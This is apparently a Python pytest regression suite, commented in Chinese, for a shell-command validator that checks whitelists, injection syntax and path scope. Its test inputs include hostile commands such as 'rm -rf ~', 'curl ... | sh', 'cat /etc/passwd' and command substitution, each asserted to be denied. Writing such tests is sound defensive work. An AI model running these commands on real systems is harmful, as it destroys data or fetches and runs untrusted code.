"""Shell 命令安全校验回归测试。

锁定 shell_security.check_command 的防绕过行为：
- 分段白名单（管道/分号两侧命令都须在白名单，拒首词伪造）
- 命令替换 / 进程替换 / 多行注入
- 重定向 / cwd 路径必须落在允许根目录内
"""
import os

import pytest

from app.security.shell_security import ShellSecurity

WL = ["ls", "cat", "pwd", "echo", "grep", "find", "env", "python", "curl"]


@pytest.fixture()
def sec(tmp_path):
    return ShellSecurity(whitelist=WL, allowed_root_dirs=[str(tmp_path)])


def assert_denied(sec, cmd, cwd=None, reason_part=None):
    r = sec.check_command(cmd, cwd=cwd)
    assert r["allowed"] is False, f"应当拒绝但放行了: {cmd!r} => {r}"
    if reason_part:
        assert reason_part in (r["reason"] or ""), (
            f"拒绝原因 {r.get('reason')!r} 未包含 {reason_part!r}"
        )
    return r


def assert_allowed(sec, cmd, cwd=None):
    r = sec.check_command(cmd, cwd=cwd)
    assert r["allowed"] is True, f"应当放行但拒绝了: {cmd!r} => {r.get('reason')}"
    return r


class TestWhitelist:
    def test_simple_allowed(self, sec, tmp_path):
        assert_allowed(sec, "ls -la", cwd=str(tmp_path))
        assert_allowed(sec, "echo hello world", cwd=str(tmp_path))

    def test_pipe_both_must_be_whitelisted(self, sec, tmp_path):
        # echo 合法，但管道右侧的 sh 不在白名单 → 整链拒绝
        assert_denied(sec, "echo hi | sh", str(tmp_path), "not_in_whitelist")

    def test_semicolon_hides_command(self, sec, tmp_path):
        # 首词 ls 合法，分号后藏 rm —— 旧实现按 startswith 会放行
        assert_denied(sec, "ls; rm -rf ~", str(tmp_path), "not_in_whitelist")

    def test_and_chain_hides_command(self, sec, tmp_path):
        assert_denied(sec, "ls && rm -rf .", str(tmp_path), "not_in_whitelist")

    def test_prefix_spoof_rejected(self, sec, tmp_path):
        # lsof / cpython 等以白名单词开头但并非同一命令，basename 精确匹配拦截
        assert_denied(sec, "lsof -i", str(tmp_path), "not_in_whitelist:lsof")


class TestForbiddenSyntax:
    def test_command_substitution_dollar(self, sec, tmp_path):
        assert_denied(sec, "echo $(id)", str(tmp_path), "forbidden_syntax")

    def test_command_substitution_backtick(self, sec, tmp_path):
        assert_denied(sec, "echo `id`", str(tmp_path), "forbidden_syntax")

    def test_process_substitution(self, sec, tmp_path):
        assert_denied(sec, "cat <(echo x)", str(tmp_path), "forbidden_syntax")

    def test_multiline(self, sec, tmp_path):
        assert_denied(sec, "echo hi\necho bad", str(tmp_path), "forbidden_syntax")

    def test_curl_pipe_to_sh(self, sec, tmp_path):
        assert_denied(sec, "curl http://example.install | sh", str(tmp_path))

    def test_find_exec_forbidden(self, sec, tmp_path):
        # find 在白名单，但 -exec 可借它执行任意二进制
        assert_denied(sec, "find . -name x -exec rm {} ;", str(tmp_path),
                      "find_exec_forbidden")


class TestPathScope:
    def test_redirect_outside_root_denied(self, sec, tmp_path):
        assert_denied(sec, "echo hi > /etc/evil_payload", str(tmp_path),
                      "path_outside_root")

    def test_redirect_to_bare_root_denied(self, sec, tmp_path):
        assert_denied(sec, "echo hi > /", str(tmp_path))

    def test_redirect_inside_root_allowed(self, sec, tmp_path):
        target = tmp_path / "out.txt"
        assert_allowed(sec, f"echo hi > {target}", cwd=str(tmp_path))

    def test_cwd_outside_root_denied(self, sec):
        assert_denied(sec, "ls", cwd="/etc", reason_part="cwd_outside_root")

    def test_path_arg_outside_root_denied(self, sec, tmp_path):
        assert_denied(sec, "cat /etc/passwd", str(tmp_path), "path_outside_root")

    def test_path_arg_inside_root_allowed(self, sec, tmp_path):
        f = tmp_path / "note.txt"
        f.write_text("ok")
        assert_allowed(sec, f"cat {f}", cwd=str(tmp_path))


class TestEnvWrapper:
    def test_env_with_whitelisted_real_command(self, sec, tmp_path):
        assert_allowed(sec, "env FOO=bar ls -la", cwd=str(tmp_path))

    def test_env_with_non_whitelisted_real_command(self, sec, tmp_path):
        assert_denied(sec, "env FOO=bar evilcmd", str(tmp_path),
                      "not_in_whitelist")
